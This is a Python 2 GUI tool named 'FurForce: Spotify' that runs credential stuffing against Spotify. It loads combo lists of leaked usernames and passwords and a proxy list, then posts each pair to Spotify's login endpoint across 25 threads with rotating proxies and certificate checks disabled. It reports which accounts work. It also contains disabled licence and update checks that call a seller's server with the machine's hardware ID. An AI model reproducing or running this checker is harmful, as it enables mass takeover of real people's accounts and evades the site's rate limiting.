# -*- coding: utf-8 -*-
__author__ = 'Furry~'
import concurrent.futures
import requests
import requests.exceptions
import sys
import uuid
import Tkinter as Tk
import re
from tkFileDialog import askopenfilename
from random import choice


class App():
    def __init__(self, parent):

        # Check To See If You Purchased c:
        # self.ownercheck()

        # Check To See If There's An Update
        # self.updatecheck()

        # Setup Window
        self.window = parent
        self.window.title('FurForce: Spotify')

        # Set Variables
        self.fileopenoptions = dict(defaultextension='.txt', filetypes=[('Text file', '*.txt'), ('All files', '*.*')])
        self.combos = Tk.StringVar(self.window)
        self.proxies = Tk.StringVar(self.window)

        # Make Widgets
        self.labelproxies = Tk.Label(self.window, text="Proxies: ")
        self.labelcombos = Tk.Label(self.window, text="Combo List: ")
        self.entrycombos = Tk.Entry(self.window, textvariable=self.combos)
        self.entryproxies = Tk.Entry(self.window, textvariable=self.proxies)
        self.startbutton = Tk.Button(self.window, text="Start!", command=self.start)
        self.combosbutton = Tk.Button(self.window, text="Open Combo File!", command=self.setcombos)
        self.proxybutton = Tk.Button(self.window, text="Open Proxy File!", command=self.setproxies)

        # Grid Widgets
        self.labelproxies.grid(row=3, column=0, sticky=Tk.W)
        self.entryproxies.grid(row=3, column=1, columnspan=4, sticky=Tk.W+Tk.E+Tk.N+Tk.S)
        self.proxybutton.grid(row=3, column=5, sticky=Tk.W+Tk.E+Tk.N+Tk.S)
        self.startbutton.grid(row=5, column=0, columnspan=7, sticky=Tk.W+Tk.E+Tk.N+Tk.S)
        self.labelcombos.grid(row=2, column=0, sticky=Tk.W)
        self.entrycombos.grid(row=2, column=1, columnspan=4, sticky=Tk.W+Tk.E+Tk.N+Tk.S)
        self.combosbutton.grid(row=2, column=5, sticky=Tk.W+Tk.E+Tk.N+Tk.S)

    def ownercheck(self):
        r = requests.get('http://coinsgo.in/spotify.php?hwid={0}'.format(str(uuid.getnode())),
                         proxies={})
        if 'truelikeurmumspot' in r.text:
            print "You own this c:!"
        else:
            print "You do not own this. Please go away :c!"
            sys.exit("ur poop")

    def updatecheck(self):
        r = requests.get('http://coinsgo.in/version.xml',
                         proxies={})
        if '1.0.0.0' in r.text:
            print "Up to date!"
        else:
            print "Please visit http://coinsgo.in/ to update"

    def spotify(self, user, pword):
        global work
        work = True
        while work:
            try:
                proxy = choice(proxies).strip()
                proxie = {
                    'https': 'http://{0}'.format(proxy)
                }
                print proxie
                response = requests.get('https://www.spotify.com/us/account/overview/', proxies=proxie,
                                        timeout=7.5, verify=False)
                print response.text
                cookies = requests.utils.dict_from_cookiejar(response.cookies)
                regex = re.compile('<input type="hidden" name="utm-keywords" value="(.*?)">')
                r = re.search(regex, response.text)
                data = {
                    'sp_csrf': cookies['sp_csrf'],
                    'forward_url': '%2Fus%2Faccount%2Foverview%2F',
                    'referrer': '',
                    'utm-keywords': r.groups()[0],
                    'user_name': user,
                    'password': pword
                }
                print data
                headers = {
                    'User-agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0',
                    'Referer': 'https://www.spotify.com/us/login/?forward_url=%2Fus%2Faccount%2Foverview%2F',
                    'X-Requested-With': 'XMLHttpRequest'
                }
                login = requests.post('https://www.spotify.com/us/xhr/json/login.php', data=data,
                                      verify=False, proxies=proxie, headers=headers, cookies=response.cookies,
                                      timeout=7.5)
                if 'account-link logout-link' in login.text:
                    print '{0}:{1} Works For Spotify!'.format(user, pword)
                else:
                    print '{0}:{1} Doesn\'t Work For Spotify!'.format(user, pword)
                work = False
            except requests.exceptions.HTTPError:
                print "HTTP Error!"
                work = True
            except requests.exceptions.ConnectionError:
                print "Connection Error!"
                work = True
            except requests.exceptions.Timeout:
                print "Timeout Error!"
                work = True

    def start(self):
        if self.entrycombos.get() == '':
            print 'You didn\'t add any combos!'
        else:
            with open(self.entrycombos.get(), 'r') as f:
                global userpass
                userpass = f.readlines()
                f.close()
        if self.proxies.get() == '':
            print 'You didn\'t add any proxies!'
        else:
            with open(self.proxies.get(), 'r') as f:
                global proxies
                proxies = f.readlines()
                f.close()
        with concurrent.futures.ThreadPoolExecutor(max_workers=25) as x:
            for userpasscombo in userpass:
                upass = userpasscombo.split(':')
                x.submit(self.spotify, upass[0].strip(), upass[1].strip())

    def setproxies(self):
        filename = askopenfilename(**self.fileopenoptions)
        self.proxies.set(filename)

    def setcombos(self):
        filename = askopenfilename(**self.fileopenoptions)
        self.combos.set(filename)

if __name__ == "__main__":
    root = Tk.Tk()
    app = App(root)
    root.mainloop()